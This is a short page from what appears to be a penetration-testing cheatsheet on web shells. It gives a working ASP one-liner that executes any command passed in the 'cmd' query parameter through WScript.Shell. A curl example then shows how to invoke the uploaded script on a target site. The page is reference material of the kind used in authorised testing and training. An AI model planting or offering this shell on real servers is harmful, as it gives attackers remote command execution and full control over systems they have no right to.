---
layout: default
parent: Other
grand_parent: Pentest Cheatsheets
title: Web Shells
nav-order: 1
---

<details open markdown="block">
  <summary>
    Table of contents
  </summary>
  {: .text-delta }
1. TOC
{:toc}
</details>

**ASP/ASPX**
==========

**Simple asp**
--------------

```
\\ Save to script
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>

\\ After upload to site once you know where to locate uploaded script
curl http://SITE/SCRIPT.asp?cmd=whoami
```
